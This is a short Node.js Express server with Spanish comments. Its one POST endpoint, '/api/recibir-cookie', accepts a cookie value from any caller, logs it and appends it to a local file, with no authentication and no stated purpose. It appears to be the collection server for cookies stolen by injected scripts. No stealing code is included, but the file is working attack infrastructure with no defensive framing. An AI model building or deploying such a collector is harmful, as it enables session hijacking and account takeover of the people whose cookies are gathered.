const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

app.post('/api/recibir-cookie', (req, res) => {
    const { cookie } = req.body;
    console.log('Cookie recibida:', cookie);

    // Ruta del archivo donde se guardarán las cookies
    const filePath = path.join(__dirname, 'cookies');

    // Escribe la cookie en el archivo
    fs.appendFile(filePath, cookie + '\n', (err) => {
        if (err) {
            console.error('Error al escribir en el archivo:', err);
            res.status(500).send('Error al guardar la cookie');
        } else {
            console.log('Cookie guardada correctamente');
            res.send('Cookie recibida y guardada correctamente');
        }
    });
});

app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});
